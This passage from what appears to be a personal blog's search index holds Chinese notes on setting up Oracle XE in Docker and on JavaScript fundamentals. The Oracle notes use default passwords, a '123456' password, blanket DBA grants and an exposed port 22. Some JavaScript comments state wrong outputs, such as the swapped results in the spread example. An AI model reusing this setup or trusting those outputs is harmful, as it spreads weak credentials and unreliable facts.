Learning-CSDN博客</a></p>\n</blockquote>\n<p>Oracle 11帳號密碼<br>這邊紀錄 Dbeaver 登入<br>user:system<br>pwd: oracle</p>\n<h2 id=\"normal\"><a href=\"#normal\" class=\"headerlink\" title=\"normal\"></a>normal</h2><p>user: sys<br>pwd: oracle<br>dba</p>\n<p>這邊進去不能新增資料表<br>要新增帳號<br>dbeaver 可以新增模式比較快<br>新增帳號還序要設定權限</p>\n<figure class=\"highlight sql\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">GRANT</span> <span class=\"keyword\">CONNECT</span>, <span class=\"keyword\">RESOURCE</span>, DBA <span class=\"keyword\">TO</span> miles;</span><br></pre></td></tr></table></figure>\n<p>設定玩資料夾就可以建制了</p>\n<p>這邊也有發現 Oracle 12 上新增帳號設定需要特別設定</p>\n<figure class=\"highlight sql\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">ALTER</span> <span class=\"keyword\">SESSION</span> <span class=\"keyword\">SET</span> <span class=\"string\">\"_ORACLE_SCRIPT\"</span>=<span class=\"literal\">TRUE</span>;</span><br><span class=\"line\"><span class=\"keyword\">CREATE</span> <span class=\"keyword\">USER</span> miles <span class=\"keyword\">IDENTIFIED</span> <span class=\"keyword\">BY</span> <span class=\"number\">123456</span>;</span><br><span class=\"line\"><span class=\"keyword\">GRANT</span> <span class=\"keyword\">CONNECT</span>, <span class=\"keyword\">RESOURCE</span>, DBA <span class=\"keyword\">TO</span> miles;</span><br><span class=\"line\"><span class=\"keyword\">ALTER</span> <span class=\"keyword\">SESSION</span> <span class=\"keyword\">SET</span> <span class=\"string\">\"_ORACLE_SCRIPT\"</span>=<span class=\"literal\">FALSE</span>;</span><br></pre></td></tr></table></figure>\n<p>參考: <a href=\"https://mileslin.github.io/2019/06/%E4%BD%BF%E7%94%A8-Docker-%E5%BB%BA%E7%AB%8B-Oracle-%E6%9C%8D%E5%8B%99/\" target=\"_blank\" rel=\"noopener\">[Docker] 使用 Docker 建立 Oracle 服務 - Miles’s Journey</a></p>\n<p>相關連結</p>\n<ul>\n<li><a href=\"https://yingclin.github.io/2018/create-oracle-docker-container.html\" target=\"_blank\" rel=\"noopener\">在 Docker 中建立 Oracle 12c 的測試主機 | 想不起來而已</a></li>\n<li><a href=\"https://ithelp.ithome.com.tw/articles/10229655\" target=\"_blank\" rel=\"noopener\">使用 Docker 建立 Oracle 12c &amp; 新增使用者建立範例資料庫 - iT 邦幫忙::一起幫忙解決難題，拯救 IT 人的一天</a></li>\n<li><a href=\"https://blog.darkthread.net/blog/setup-xe-centos/\" target=\"_blank\" rel=\"noopener\">在 CentOS 安裝 Oracle XE 18c-黑暗執行緒</a></li>\n<li><a href=\"https://zoctan.github.io/2018/05/21/%E4%BD%BF%E7%94%A8%E8%BF%87%E7%A8%8B/%E4%BD%BF%E7%94%A8%20Docker%20Oracle/\" target=\"_blank\" rel=\"noopener\">使用 Docker Oracle | Zoctan’s Blog</a></li>\n<li><a href=\"https://my.oschina.net/u/3049601/blog/3112371\" target=\"_blank\" rel=\"noopener\">CENTOS 7 使用Docker安装oracle 11g - 特拉仔的个人空间 - OSCHINA</a><br><a href=\"https://www.cnblogs.com/mq0036/p/4724466.html\" target=\"_blank\" rel=\"noopener\">批处理执行多个SQL文件到oracle - jack_Meng - 博客园</a></li>\n</ul>\n<h2 id=\"docker-entrypoint-initdb-d\"><a href=\"#docker-entrypoint-initdb-d\" class=\"headerlink\" title=\"docker-entrypoint-initdb.d\"></a>docker-entrypoint-initdb.d</h2><figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">for</span> f <span class=\"keyword\">in</span> /docker-entrypoint-initdb.d/*; <span class=\"keyword\">do</span></span><br><span class=\"line\">\t<span class=\"built_in\">echo</span> <span class=\"string\">\"found file /docker-entrypoint-initdb.d/<span class=\"variable\">$f</span>\"</span></span><br><span class=\"line\">\t<span class=\"keyword\">case</span> <span class=\"string\">\"<span class=\"variable\">$f</span>\"</span> <span class=\"keyword\">in</span></span><br><span class=\"line\">\t\t*.sh)     <span class=\"built_in\">echo</span> <span class=\"string\">\"[IMPORT] <span class=\"variable\">$0</span>: running <span class=\"variable\">$f</span>\"</span>; . <span class=\"string\">\"<span class=\"variable\">$f</span>\"</span> ;;</span><br><span class=\"line\">\t\t*.sql)    <span class=\"built_in\">echo</span> <span class=\"string\">\"[IMPORT] <span class=\"variable\">$0</span>: running <span class=\"variable\">$f</span>\"</span>; <span class=\"built_in\">echo</span> <span class=\"string\">\"exit\"</span> | su oracle -c <span class=\"string\">\"NLS_LANG=.<span class=\"variable\">$CHARACTER_SET</span> <span class=\"variable\">$ORACLE_HOME</span>/bin/sqlplus -S / as sysdba @<span class=\"variable\">$f</span>\"</span>; <span class=\"built_in\">echo</span> ;;</span><br><span class=\"line\">\t\t*.dmp)    <span class=\"built_in\">echo</span> <span class=\"string\">\"[IMPORT] <span class=\"variable\">$0</span>: running <span class=\"variable\">$f</span>\"</span>; impdp <span class=\"variable\">$f</span> ;;</span><br><span class=\"line\">\t\t*)        <span class=\"built_in\">echo</span> <span class=\"string\">\"[IMPORT] <span class=\"variable\">$0</span>: ignoring <span class=\"variable\">$f</span>\"</span> ;;</span><br><span class=\"line\">\t<span class=\"keyword\">esac</span></span><br><span class=\"line\">\t<span class=\"built_in\">echo</span></span><br><span class=\"line\"><span class=\"keyword\">done</span></span><br></pre></td></tr></table></figure>\n<p>由於這個關係，我可以簡單設定 db schmema create 語法</p>\n<p>init.sql 放在 /docker-entrypoint-initdb.d/<br>裡面放 sql 資料夾<br>注意，sql 資料夾並不會執行(* 只會抓到同意層資料)</p>\n<p>init.sql<br><figure class=\"highlight sql\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">CREATE</span> <span class=\"keyword\">USER</span> XXXX <span class=\"keyword\">IDENTIFIED</span> <span class=\"keyword\">BY</span> XXXX;</span><br><span class=\"line\"><span class=\"keyword\">GRANT</span> <span class=\"keyword\">CONNECT</span>, <span class=\"keyword\">RESOURCE</span>, DBA <span class=\"keyword\">TO</span> XXXX;</span><br><span class=\"line\"><span class=\"keyword\">CREATE</span> <span class=\"keyword\">USER</span> XXXXMGR <span class=\"keyword\">IDENTIFIED</span> <span class=\"keyword\">BY</span> XXXX;</span><br><span class=\"line\"><span class=\"keyword\">alter</span> <span class=\"keyword\">session</span> <span class=\"keyword\">set</span> current_schema=XXXXMGR;</span><br><span class=\"line\">@/docker-entrypoint-initdb.d/sql/schema/xxxx.sql</span><br></pre></td></tr></table></figure></p>\n<p>list 資料夾所有目錄方法</p>\n<p> find  <code>pwd</code> -type f </p>\n<p> 就可把相關 sql 用出來</p>\n<p> docker-compose.yml 留一下</p>\n <figure class=\"highlight yml\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"attr\">version:</span> <span class=\"string\">'2'</span></span><br><span class=\"line\"><span class=\"attr\">services:</span></span><br><span class=\"line\"><span class=\"attr\">  oracle:</span></span><br><span class=\"line\"><span class=\"attr\">    image:</span> <span class=\"string\">oracle-xe-11g</span></span><br><span class=\"line\"><span class=\"attr\">    restart:</span> <span class=\"string\">always</span>   <span class=\"comment\">#如果docker容器由于一些问题挂掉的化，docker-composer会自动把容器给启动起来</span></span><br><span class=\"line\"><span class=\"attr\">    ports:</span></span><br><span class=\"line\"><span class=\"bullet\">      -</span> <span class=\"number\">1521</span><span class=\"string\">:1521</span></span><br><span class=\"line\"><span class=\"bullet\">      -</span> <span class=\"number\">8080</span><span class=\"string\">:8080</span></span><br><span class=\"line\"><span class=\"bullet\">      -</span> <span class=\"number\">22</span><span class=\"string\">:22</span></span><br><span class=\"line\"><span class=\"attr\">    volumes:</span></span><br><span class=\"line\"><span class=\"bullet\">    -</span> <span class=\"string\">./docker-entrypoint-initdb.d/:/docker-entrypoint-initdb.d/</span></span><br><span class=\"line\"><span class=\"attr\">    environment:</span> </span><br><span class=\"line\"><span class=\"bullet\">      -</span> <span class=\"string\">LC_ALL=C.UTF-8</span> </span><br><span class=\"line\"><span class=\"string\">`</span></span><br></pre></td></tr></table></figure>","categories":["Docker"],"tags":["docker","oracle"]},{"title":"我的JavaScript筆記","url":"/blog/2019/03/10/%E6%88%91%E7%9A%84JavaScript%E7%AD%86%E8%A8%98/","content":"<p>由於今天上課<br>簡單小記今天上課我覺得記不住，但是該紀錄的筆記<br>有可能會記入錯誤<br>所以算是我的觀點<br>有錯不要怪我喔!!有錯不要怪我喔!!有錯不要怪我喔!!<br>想真的了解 JS，可以自己 Google 一下核心部分課程<br>應該也只有一個人教(就不打廣告了)<br>這邊是我的筆記(我覺得重要的)</p>\n<a id=\"more\"></a>\n<p>變數是指標，指向記憶體中的資料</p>\n<p>宣告變數<code>var</code>的同時，也會成為某物件下的屬性 (不一定是根物件,ex:function)<br>屬性可以用 delete 刪除，`變數<strong>無法</strong>被刪除</p>\n<p>var 在一般外面 function 宣告，會寫在 window<br>function 寫在 ao 物件<a href=\"http://notepad.yehyeh.net/Content/WebDesign/Javascript/ECMA/Core/JavaScriptCore.php#section7\" target=\"_blank\" rel=\"noopener\">ECMA-262 Javascript 核心</a></p>\n<figure class=\"highlight js\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"built_in\">Number</span>.prototype.name = <span class=\"string\">\"Hello\"</span>;</span><br><span class=\"line\"><span class=\"keyword\">var</span> a = <span class=\"number\">1</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"built_in\">console</span>.log(a.name); <span class=\"comment\">// 'Hello' number 祖先關係，原型</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">delete</span> a.name;</span><br><span class=\"line\"><span class=\"comment\">// ture 刪一個不存在地方，會回傳 true \\*這一點真的會讓人家以為有刪除成功</span></span><br><span class=\"line\"></span><br><span class=\"line\">a.name;</span><br><span class=\"line\"><span class=\"comment\">//Hello</span></span><br></pre></td></tr></table></figure>\n<p>var 與 let 的範圍</p>\n<p>JavaScript 裡的型別</p>\n<p>原始型別</p>\n<ul>\n<li>number</li>\n<li>string</li>\n<li>boolean</li>\n<li>null</li>\n<li>undefined</li>\n<li>symbol</li>\n<li>物件型別</li>\n</ul>\n<p>原始型別</p>\n<p>屬性不可添加(但可以擺繼承 interface[string,number…])</p>\n<p>物件型別<br>可以擴充屬性</p>\n<p>這邊也有提到重點<a href=\"https://blog.miniasp.com/post/2013/07/11/Front-end-Research-JavaScript-valueOf-method\" target=\"_blank\" rel=\"noopener\">前端工程研究：關於 JavaScript 中物件的 valueOf 方法 | The Will Will Web</a><br>注意 sort 排序竟然是依照 toString 去做(我還沒有遇到這個雷…)<br>如何判斷數字排序呢?<br><a href=\"https://developer.mozilla.org/zh-TW/docs/Web/JavaScript/Reference/Global_Objects/Array/sort\" target=\"_blank\" rel=\"noopener\">Array.prototype.sort() - JavaScript | MDN</a></p>\n<figure class=\"highlight js\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">var</span> numbers = [<span class=\"number\">4</span>, <span class=\"number\">2</span>, <span class=\"number\">5</span>, <span class=\"number\">1</span>, <span class=\"number\">3</span>];</span><br><span class=\"line\">numbers.sort(<span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\">a, b</span>) </span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">return</span> a - b;</span><br><span class=\"line\">&#125;);</span><br></pre></td></tr></table></figure>\n<p>小記 sort</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">* 若 compareFunction(a, b) 的回傳值小於 0，則會把 a 排在小於 b 之索引的位置，即 a 排在 b 前面。</span><br><span class=\"line\">* 若 compareFunction(a, b) 回傳 0，則 a 與 b 皆不會改變彼此的順序，但會與其他全部的元素比較來排序。備註：ECMAscript 標準並不保證這個行為，因此不是所有瀏覽器（如 Mozilla 版本在 2003 以前）都遵守此行為。</span><br><span class=\"line\">* 若 compareFunction(a, b) 的回傳值大於 0，則會把 b 排在小於 a 之索引的位置，即 b 排在 a 前面。</span><br><span class=\"line\">* compareFunction(a, b) 在給予一組特定元素 a 及 b 為此函數之兩引數時必須總是回傳相同的值。若回傳值不一致，排序順序則為 undefined。(看不懂這還意義，但好像undefined會移到最後面去)</span><br><span class=\"line\">[sorting - javascript array.sort with undefined values - Stack Overflow](https://stackoverflow.com/questions/4783242/javascript-array-sort-with-undefined-values)</span><br></pre></td></tr></table></figure>\n<p>簡單來說 <code>a,b</code>回傳小於 0 的時候，不會調整；反之，<code>a,b</code>回傳大於 0 的時候，會調整位置成<code>b,a</code></p>\n<p>原始型別包裹物件<br><strong>需要用 new(沒加 new 是轉型)</strong><br>包裹物件可以改裡面屬性</p>\n<figure class=\"highlight js\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">var</span> numObj = <span class=\"number\">17</span>;</span><br><span class=\"line\">numObj.xxx = <span class=\"string\">\"2\"</span>;</span><br><span class=\"line\"><span class=\"built_in\">console</span>.log(numObj); <span class=\"comment\">// undefined</span></span><br></pre></td></tr></table></figure>\n<figure class=\"highlight js\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">var</span> numObj = <span class=\"keyword\">new</span> <span class=\"built_in\">Number</span>(<span class=\"string\">\"17\"</span>);</span><br><span class=\"line\">numObj.xxx = <span class=\"string\">\"2\"</span>;</span><br><span class=\"line\"><span class=\"built_in\">console</span>.log(numObj); <span class=\"comment\">// 2</span></span><br></pre></td></tr></table></figure>\n<figure class=\"highlight js\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">var</span> s = <span class=\"string\">\"Hello\"</span>;</span><br><span class=\"line\">s[<span class=\"number\">0</span>] = <span class=\"string\">\"J\"</span>;</span><br><span class=\"line\"><span class=\"built_in\">console</span>.log();</span><br></pre></td></tr></table></figure>\n<p>Number VS parseInt()</p>\n<p>Number(1)是轉型，這跟 parseInt 很像，但細部內容不一樣</p>\n<figure class=\"highlight js\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"built_in\">Number</span>(<span class=\"string\">\"1abc\"</span>); <span class=\"comment\">// NaN</span></span><br><span class=\"line\"><span class=\"built_in\">parseInt</span>(<span class=\"string\">\"1abc\"</span>, <span class=\"number\">10</span>); <span class=\"comment\">// 1</span></span><br></pre></td></tr></table></figure>\n<p>之前公司都是用 parseInt(xxx)轉型，公司的老鳥有說過後面要加第二個參數比較好<code>parseInt(xxx,10)</code><br>但是轉型的話還是用 Number 比較好</p>\n<p>數字運算需要注意的事情</p>\n<p>0.1 + 0.2 != 0.3 =&gt; true</p>\n<p>(0.5).toString(2); // 0.1<br>(0.25).toString(2); //0.01<br>(0.125).toString(2); //0.001</p>\n<p>0.300000000000004</p>\n<p>(0.1).toString(2)<br>// 0.0001100110011001100110011001100110011001100110011001101<br>(0.2).toString(2)<br>// 0.001100110011001100110011001100110011001100110011001101</p>\n<p>所以正常要做大數字的運算還是需要用到別的寫好的 js</p>\n<p>BigInt<br>目前只有 chrome 支援</p>\n<p>NULL 要注意的事情<br><code>typeof null // object</code></p>\n<p>null 只能跟 null 與 undefined 比較<br>NaN 跟任何物件比較都是 false</p>\n<p>所以平常<code>typeof a</code>這段沒辦法知道 a 變數是不是物件(因為也有可能是 null)</p>\n<p><code>typeof(a) == &#39;object&#39; &amp;&amp; a!== null</code><br>完整判斷寫法</p>\n<p>undefined IE8 的 bug</p>\n<figure class=\"highlight js\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">var</span> <span class=\"literal\">undefined</span> = <span class=\"number\">33</span>;</span><br><span class=\"line\"><span class=\"built_in\">console</span>.log(<span class=\"built_in\">window</span>.undefined);</span><br><span class=\"line\"><span class=\"keyword\">var</span> a; <span class=\"comment\">// 33 (chrome,firefox,IE&gt;=9是undefined)</span></span><br></pre></td></tr></table></figure>\n<p>jQuery 處理 undefined 被修改問題(IE8 的 bug)</p>\n<figure class=\"highlight js\"><table><tr><td class=\"code\"><pre><span class=\"line\">(<span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\">jQuery, undefined</span>) </span>&#123;</span><br><span class=\"line\">    ...;</span><br><span class=\"line\">    <span class=\"built_in\">window</span>.jQuery = <span class=\"built_in\">window</span>.$ = <span class=\"keyword\">this</span>;</span><br><span class=\"line\">&#125;)(jQuery);</span><br></pre></td></tr></table></figure>\n<p>關於 Date 字串格式 GMT 注意問題</p>\n<figure class=\"highlight js\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">new</span> <span class=\"built_in\">Date</span>(<span class=\"string\">\"2019-01-01\"</span>); <span class=\"comment\">// 正規ISO時間，所以是用ISO時間</span></span><br><span class=\"line\"><span class=\"keyword\">new</span> <span class=\"built_in\">Date</span>(<span class=\"string\">\"2019/01/01\"</span>); <span class=\"comment\">// 非正規ISO時間，所以是用本地時間</span></span><br></pre></td></tr></table></figure>\n<p><a href=\"https://blog.miniasp.com/post/2016/09/25/JavaScript-Date-usage-in-details\" target=\"_blank\" rel=\"noopener\">前端工程研究：關於 JavaScript 中 Date 型別的常見地雷與建議作法 | The Will Will Web</a><br>JavaScript 物件資料結構</p>\n<p>物件回收</p>\n<p>當 delete 掉屬性，沒相連跟物件就會被 gc 回收<br>以瀏覽器的 js 為例，所有的頭都是 window 物件，當 window 屬性與變數 delete 掉時，將會自動回收<br>(這一點感覺就跟 git 很像，只是 git 的 commit 上面沒有 branch 時候之後會自動被回收)</p>\n<p>hoisting</p>\n<p>會做 hoisting 有</p>\n<ol>\n<li>function a(){ xxxx}</li>\n<li><code>var</code> a = 1;，var 開頭的</li>\n</ol>\n<p>但是<code>var a = function(){xxxx}</code>，不會做 hoisting</p>\n<figure class=\"highlight js\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"built_in\">console</span>.log(a); <span class=\"comment\">//undefined</span></span><br><span class=\"line\"><span class=\"keyword\">var</span> a = <span class=\"number\">1</span>;</span><br></pre></td></tr></table></figure>\n<p>程式會變成</p>\n<figure class=\"highlight js\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">var</span> a;</span><br><span class=\"line\"><span class=\"built_in\">console</span>.log(a); <span class=\"comment\">//undefined</span></span><br><span class=\"line\">a = <span class=\"number\">1</span>;</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight js\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">a</span>(<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">var</span> test = <span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\">    <span class=\"built_in\">console</span>.log(<span class=\"number\">1</span>);</span><br><span class=\"line\">  &#125;;</span><br><span class=\"line\">  <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">test</span>(<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\">    <span class=\"built_in\">console</span>.log(<span class=\"number\">2</span>);</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  test();</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">a();</span><br></pre></td></tr></table></figure>\n<p>同等於</p>\n<figure class=\"highlight js\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">a</span>(<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">var</span> test;</span><br><span class=\"line\">  <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">test</span>(<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\">    <span class=\"built_in\">console</span>.log(<span class=\"number\">2</span>);</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  test = <span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\">    <span class=\"built_in\">console</span>.log(<span class=\"number\">1</span>);</span><br><span class=\"line\">  &#125;;</span><br><span class=\"line\">  test();</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">a();</span><br></pre></td></tr></table></figure>\n<p><strong> let 區域變數在的時候，不會受到 hoisting 影響 </strong></p>\n<p>let 生命週期是在<code>{}</code>裡面，這邊跟 Java 一樣<br>在宣告時候之前出現變數，是不允許的，就算上{}有 var 變數，也不會顯示出來(這部份看下面範例，很容易忽略)</p>\n<figure class=\"highlight js\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">var</span> a = <span class=\"number\">1</span>;</span><br><span class=\"line\"><span class=\"built_in\">console</span>.log(a); <span class=\"comment\">// 1</span></span><br><span class=\"line\"><span class=\"keyword\">if</span> (<span class=\"literal\">true</span>) &#123;</span><br><span class=\"line\">  <span class=\"comment\">//這邊因為let關係，所以抓不到外面的var，這一點要注意!!!很容易不小心忽略這個特性</span></span><br><span class=\"line\">  <span class=\"built_in\">console</span>.log(a); <span class=\"comment\">// can't access lexical declaration</span></span><br><span class=\"line\">  <span class=\"keyword\">let</span> a = <span class=\"number\">2</span>;</span><br><span class=\"line\">  <span class=\"built_in\">console</span>.log(a); <span class=\"comment\">// 2</span></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"built_in\">console</span>.log(a); <span class=\"comment\">// 1</span></span><br></pre></td></tr></table></figure>\n<p>簡稱 ESM(ECMAScript Module)</p>\n<p>不管各模組間寫了幾次 import，只會 import 一次，</p>\n<blockquote>\n<p>主模組呼叫 <code>A.js</code> <code>B.js</code> <code>C.js</code> 但是<code>A.js</code>有呼叫<code>B.js</code><br>所以<code>B.js</code>指呼叫一次，不會重新載入</p>\n</blockquote>\n<p>可變的寫法</p>\n<figure class=\"highlight js\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">var</span> a = [];</span><br><span class=\"line\"><span class=\"keyword\">var</span> b = a;</span><br><span class=\"line\">a.push(<span class=\"number\">1</span>);</span><br><span class=\"line\"><span class=\"built_in\">console</span>.log(a); <span class=\"comment\">//[1]</span></span><br><span class=\"line\"><span class=\"built_in\">console</span>.log(b); <span class=\"comment\">//[1]</span></span><br></pre></td></tr></table></figure>\n<p>不可變的寫法</p>\n<figure class=\"highlight js\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">var</span> a = [];</span><br><span class=\"line\"><span class=\"keyword\">var</span> b = a;</span><br><span class=\"line\">a = [...a, <span class=\"number\">1</span>]; <span class=\"comment\">// 重新宣告變數，陣列內的 ...a 變數指向原本變數的</span></span><br><span class=\"line\"><span class=\"built_in\">console</span>.log(a); <span class=\"comment\">//[]</span></span><br><span class=\"line\"><span class=\"built_in\">console</span>.log(b); <span class=\"comment\">//[1]</span></span><br></pre></td></tr></table></figure>\n<blockquote>\n<p>不會改掉記憶體變數，不會影響到別的變數</p>\n</blockquote>\n<p>展開運算子的重要觀念</p>\n<p>只有實作迭代器( Iterators ) 的物件，才能使用展開運算子！<br>預設所有類陣列物件都可以使用(String, Array, Map, Set, arguments )\\<br>預設所有一般物件都不能用，除非有實作迭代器屬性！</p>\n<p><a href=\"https://developer.mozilla.org/zh-TW/docs/Web/JavaScript/Reference/Global_Objects/Array/@@iterator\" target=\"_blank\" rel=\"noopener\">Array.prototype<a href=\"\">@@iterator</a> - JavaScript | MDN</a></p>\n<p><strong>容易忽略 for in /for of</strong></p>\n<p>for in 很久以前 js 就有這個東西<br>但這個是 loop 屬性(非值)</p>\n<p>for of 是比較新的語法，<br>是 loop 出屬性的值</p>\n<p>預設參數 (Default Parameters)</p>\n<figure class=\"highlight js\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">func</span>(<span class=\"params\">a = <span class=\"number\">1</span>, b, c = <span class=\"number\">3</span></span>) </span>&#123;</span><br><span class=\"line\">  <span class=\"built_in\">console</span>.log(a, b, c);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">func(<span class=\"string\">\"a\"</span>); <span class=\"comment\">//'a',undefined,3</span></span><br><span class=\"line\"><span class=\"comment\">//這邊自己腦補因為ao物件，所以b才沒有掛掉XD?</span></span><br></pre></td></tr></table></figure>\n<figure class=\"highlight js\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">func</span>(<span class=\"params\">a=&#123;&#125;</span>)</span></span><br></pre></td></tr></table></figure>\n<p>其餘參數 (Rest parameters) ( … )</p>\n<p>這玩意可以輕鬆解決 js argument 不能用 array 內建 function<br>通過這個可以輕鬆得到 array<br>也不用寫出很複雜的程式</p>\n<p>ES6 Setter 跟 Getter</p>\n<figure class=\"highlight js\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">Rect</span> </span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">constructor</span>(height, width) &#123;</span><br><span class=\"line\">    <span class=\"keyword\">this</span>.height = height;</span><br><span class=\"line\">    <span class=\"keyword\">this</span>.width = width;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  get area() &#123;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"keyword\">this</span>.width * <span class=\"keyword\">this</span>.height;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  set area(&#123; height, width &#125;) &#123;</span><br><span class=\"line\">    <span class=\"keyword\">this</span>.height = height;</span><br><span class=\"line\">    <span class=\"keyword\">this</span>.width = width;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"keyword\">const</span> square = <span class=\"keyword\">new</span> Rect(<span class=\"number\">3</span>, <span class=\"number\">3</span>);</span><br><span class=\"line\"><span class=\"built_in\">console</span>.log(square.area);</span><br></pre></td></tr></table></figure>\n<p>因為 setter 只能放一個參數，放多個以上會跳出這個訊息<br>SyntaxError: setter functions must have one argument<br>後來 Google 有看到用帶<code>物件</code>解決<br><a href=\"http://www.imooc.com/qadetail/125923\" target=\"_blank\" rel=\"noopener\">set 方法只能接受一个参数吗？_慕课问答</a><br>但後來突然想到可以用<code>解構賦值</code>(Destructuring assignment)<br>完美解決這個問題</p>\n<p>物件擴展</p>\n<p><a href=\"http://es6.ruanyifeng.com/#docs/object#%E6%89%A9%E5%B1%95%E8%BF%90%E7%AE%97%E7%AC%A6\" target=\"_blank\" rel=\"noopener\">對象的擴展 - ECMAScript 6 入門</a></p>\n<p>當初用這個想說這個可以改成類似 jQuery <code>$.extends</code></p>\n<p>找了一下，還真的有<br><a href=\"http://larry850806.github.io/2016/09/20/shallow-vs-deep-copy/\" target=\"_blank\" rel=\"noopener\">[Javascript] 關於 JS 中的淺拷貝和深拷貝 · Larry</a><br>原生寫法</p>\n<figure class=\"highlight js\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">//jquery</span></span><br><span class=\"line\"><span class=\"keyword\">var</span> $ = <span class=\"built_in\">require</span>(<span class=\"string\">\"jquery\"</span>);</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">var</span> obj1 = &#123;</span><br><span class=\"line\">  a: <span class=\"number\">1</span>,</span><br><span class=\"line\">  b: &#123; <span class=\"attr\">f</span>: &#123; <span class=\"attr\">g</span>: <span class=\"number\">1</span> &#125; &#125;,</span><br><span class=\"line\">  c: [<span class=\"number\">1</span>, <span class=\"number\">2</span>, <span class=\"number\">3</span>]</span><br><span class=\"line\">&#125;;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">var</span> obj2 = $.extend(<span class=\"literal\">true</span>, &#123;&#125;, obj1);</span><br><span class=\"line\"><span class=\"built_in\">console</span>.log(obj1.b.f === obj2.b.f); <span class=\"comment\">// false</span></span><br><span class=\"line\"><span class=\"comment\">//assign</span></span><br><span class=\"line\"><span class=\"keyword\">var</span> obj1 = &#123; <span class=\"attr\">a</span>: <span class=\"number\">10</span>, <span class=\"attr\">b</span>: <span class=\"number\">20</span>, <span class=\"attr\">c</span>: <span class=\"number\">30</span> &#125;;</span><br><span class=\"line\"><span class=\"keyword\">var</span> obj2 = <span class=\"built_in\">Object</span>.assign(&#123;&#125;, obj1);</span><br><span class=\"line\">obj2.b = <span class=\"number\">100</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"built_in\">console</span>.log(obj1); <span class=\"comment\">// &#123; a: 10, b: 20, c: 30 &#125; &lt;-- 沒被改到</span></span><br><span class=\"line\"><span class=\"built_in\">console</span>.log(obj2); <span class=\"comment\">// &#123; a: 10, b: 100, c: 30 &#125;</span></span><br></pre></td></tr></table></figure>\n<figure class=\"highlight js\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">let</span> aWithDefaults = &#123; <span class=\"attr\">x</span>: <span class=\"number\">1</span>, <span class=\"attr\">y</span>: <span class=\"number\">2</span>, ...a &#125;;</span><br><span class=\"line\"><span class=\"comment\">// 等同于</span></span><br><span class=\"line\"><span class=\"keyword\">let</span> aWithDefaults = <span class=\"built_in\">Object</span>.assign(&#123;&#125;, &#123; <span class=\"attr\">x</span>: <span class=\"number\">1</span>, <span class=\"attr\">y</span>: <span class=\"number\">2</span> &#125;, a);</span><br><span class=\"line\"><span class=\"comment\">// 等同于</span></span><br><span class=\"line\"><span class=\"keyword\">let</span> aWithDefaults = <span class=\"built_in\">Object</span>.assign(&#123; <span class=\"attr\">x</span>: <span class=\"number\">1</span>, <span class=\"attr\">y</span>: <span class=\"number\">2</span> &#125;, a);</span><br></pre></td></tr></table></figure>\n<p>閉包該如何 debug?</p>\n<p><a 